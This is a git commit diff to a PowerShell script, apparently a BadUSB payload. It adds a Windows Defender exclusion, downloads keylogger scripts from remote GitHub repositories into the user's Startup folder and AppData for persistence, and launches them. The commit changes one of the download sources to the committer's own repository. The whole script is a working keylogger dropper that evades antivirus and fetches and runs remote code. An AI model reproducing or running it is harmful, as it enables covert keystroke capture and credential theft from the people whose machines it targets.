086c9b93ddf6eca71d7a99674124e803f48546a9
legiac <121451323+legiac@users.noreply.github.com>
2022-12-28 14:47:54 +0100

    Update s2.ps1

--- s2.ps1
+++ s2.ps1
@@ -3,6 +3,6 @@ Add-MpPreference -ExclusionPath $env:appdata/-locker
 iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-p.cmd -UseBasicParsing     -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
 iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/-keys.ps1 -UseBasicParsing  -o "$env:appdata\-locker\-keys.ps1" 
 iwr https://raw.githubusercontent.com/legiac/bu/main/-logs.ps1 -UseBasicParsing -o "$env:appdata\-locker\-logs.ps1"
-iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/exit.ps1 -UseBasicParsing -o "$env:appdata\-exit.ps1" 
+iwr https://raw.githubusercontent.com/legiac/bu/main/exit.ps1 -UseBasicParsing -o "$env:appdata\-exit.ps1" 
 
 start-process "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
